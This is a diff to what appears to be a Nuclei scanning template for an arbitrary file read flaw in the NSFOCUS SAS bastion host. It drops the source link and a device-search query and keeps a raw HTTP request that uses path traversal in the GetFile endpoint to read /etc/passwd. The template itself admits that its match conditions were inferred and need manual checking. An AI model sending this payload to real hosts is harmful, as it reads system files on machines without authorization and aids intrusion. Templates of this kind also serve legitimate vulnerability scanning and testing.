@@ -3,14 +3,8 @@ info:
   name: 绿盟SAS堡垒机GetFile任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/056d6ab14e34fabfaec7820c1a06fd77
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 056d6ab14e34fabfaec7820c1a06fd77
-    fofa: + hunter`app.name="NSFOCUS 绿盟 SAS"`
 http:
 - raw:
   - 'GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
